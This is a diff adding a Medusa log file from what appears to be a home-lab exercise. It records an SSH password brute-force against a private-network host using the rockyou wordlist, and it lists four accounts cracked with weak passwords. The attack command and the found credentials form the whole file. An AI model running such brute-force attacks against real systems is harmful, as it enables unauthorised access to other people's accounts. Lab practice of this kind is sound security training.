@@ -1,0 +1,7 @@
+# Medusa v.2.3 (2025-10-23 16:03:51)
+# medusa -U dvwa_users.txt -P /usr/share/wordlists/rockyou.txt -M ssh -h 192.168.56.103 -O sucess.txt 
+2025-10-23 16:03:58 ACCOUNT FOUND: [ssh] Host: 192.168.56.103 User: cartman Password: password [SUCCESS]
+2025-10-23 16:04:39 ACCOUNT FOUND: [ssh] Host: 192.168.56.103 User: kenny Password: qwerty [SUCCESS]
+2025-10-23 16:06:00 ACCOUNT FOUND: [ssh] Host: 192.168.56.103 User: kyle Password: football [SUCCESS]
+2025-10-23 16:07:31 ACCOUNT FOUND: [ssh] Host: 192.168.56.103 User: stan Password: superman [SUCCESS]
+# Medusa has finished (2025-10-23 16:07:31).
